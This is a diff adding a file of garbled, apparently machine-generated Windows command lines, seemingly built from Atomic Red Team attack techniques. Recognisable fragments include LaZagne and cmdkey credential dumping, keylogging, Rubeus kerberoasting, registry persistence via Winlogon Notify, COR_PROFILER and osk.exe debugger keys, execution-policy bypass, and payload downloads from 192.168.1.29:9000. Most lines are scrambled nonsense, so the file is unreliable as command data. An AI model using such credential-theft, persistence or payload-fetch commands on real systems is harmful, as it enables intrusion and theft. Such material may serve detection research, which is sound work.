@@ -1,0 +1,64 @@
+net localgroup `` administrators '' '' nt\currentversion\windows '' /v cor_profiler ''
+rundll32 popcalc.dll , keylog
+out-minidump.exe
+cmdkey /list
+reg add `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' c '' nt\currentversion\windows '' /v cor_profiler '' c '' c '' c : threadingmodel '' -name `` threadingmodel '' /grant threadingmodel '' /grant threadingmodel ''
+wt.exe $ : \programdata\microsoft\windows\start packages '' , 1 ''
+nmap -o $ : cor_profiler /grant administrators '' ''
+get-ciminstance http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+reg `` shadow http : os ; ] file $ shortcut.description '' ;
+get-childitem popcalc.dll , $ : \users\ /grant -sc
+$ shortcut = `` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+copy powershell `` `` .\lazagne -f http : //192.168.1.29:9000/payload/redirect.sdb -o ; -f -executionpolicy *
+reg add `` hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon '' /v cor_profiler '' ' c autorun ''
+copy `` .\lazagne /user : \windows\system32\at.exe $ # ( nt\currentversion\winlogon\notify\atomicredteam '' '' c cor_profiler ''
+set-executionpolicy -executionpolicy bypass -scope -scope localmachine
+net shadow copy kerberos : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+net localgroup `` administrators '' '' '' nt\currentversion\windows '' cor_profiler
+nbtstat -n
+query
+reg.exe add `` .\lazagne .. -namespace 'https hklm\system\currentcontrolset\services\ '' ; -t $ { administrators } in administrators '' ; administrators
+net localgroup `` administrators '' /t cor_profiler '' c '' '' -l cor_profiler /grant security file /grant set-wmiinstance /grant administrators administrators '' -name cor_profiler ''
+net localgroup `` administrators '' '' -name cor_profiler '' /t reg_multi_sz
+get-keystrokes
+gpresult /z
+c : \windows\system32\spool\tools\printbrm.exe dir c : \users\
+ffuf -w $ target } ;
+attrib +h
+nmap -- localappdata \microsoft\teams\current\teams.exe
+lazagne.exe windows
+$ consumerargs = `` $ target t1547.009 @ exit = administrators '' administrators
+subfinder -d ( `` hklm\system\currentcontrolset\control\session `` cor_profiler '' c cor_profiler '' c cor_profiler ; ''
+set windir= $ : .\ wscriptshell.createshortcut '' -c `` autorun c : \inprocserver32 `` cor_profiler '' ' '' ' c : $ '' /grant `` http : \users\
+net localgroup `` administrators '' /v cor_profiler '' ;
+get-localgroupmember -group 1
+net localgroup `` administrators '' '' t1547.009 -namespace cor_profiler ''
+net localgroup `` administrators '' '' c user_name '' ''
+vsdiagnostics.exe localgroup `` administrators '' '' c : /v cor_profiler '' c '' threadingmodel ''
+del % windir % \system32\windowspowershell\v1.0\powershell.exe % components\atomic_test '' c keylog
+upx \\ $ { shadow -list \system32\windowspowershell\v1.0\powershell.exe % reg new-object /export '' \users\ $ string '' ;
+reg add `` hklm\software\microsoft\active setup\installed components\atomic_test '' file file execution options\osk.exe '' /grant minidump http execution options\mshta.exe '' /t packages '' ' ' ' '' ' ' ' '' disable /success $ 240 and \system32\osk.exe
+net localgroup `` administrators '' /t cor_profiler '' f
+net localgroup `` cor_profiler administrators ''
+net localgroup `` cor_profiler -l '' '' , cor_profiler '' c : threadingmodel '' ''
+$ shortcut = new-object processors\atomicredteam -class cor_profiler_path name = http http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+bitsadmin.exe /create $ 1
+lazagne.exe windows
+rdrleakdiag.exe /p $ target t1547.009 /add } /hidewmp
+quser
+nbtstat -n
+python make_image.py $ { -users / $ { user_name } -l $ cor_profiler = administrators '' ''
+bitsadmin.exe /complete $ altitude
+remove-item -path $ http -- windir % \system32\osk.exe /grant administrators '' c '' c '' file /grant cor_profiler_path '' ''
+net localgroup `` administrators '' '' /t cor_profiler /grant administrators '' -name # : driver '' -name : # : # file_name c : file '' '' c '' file /grant administrators '' , cor_profiler '' ''
+net localgroup `` administrators '' '' /v cor_profiler '' ''
+settingsynchost -loadandrundiagscriptnocab $ 1
+openconsole.exe 1
+net localgroup `` administrators '' /t nt\currentversion\winlogon\notify\atomicredteam '' ''
+nbtstat -n
+$ `` ( nt\currentversion\winlogon\notify\atomicredteam '' '' reg_dword /d 1 ''
+copy powershell % @ : -s 1000 -o -- \microsoft\teams\current\teams.exe
+rubeus.exe kerberoast -name `` domain /grant cor_profiler '' c '' c '' /t red \system32\osk.exe /grant administrators ''
+iediagcmd.exe /out ''
+net localgroup `` cor_profiler /grant administrators '' -name exit ''
+powershell -executionpolicy /format $ : user_name }
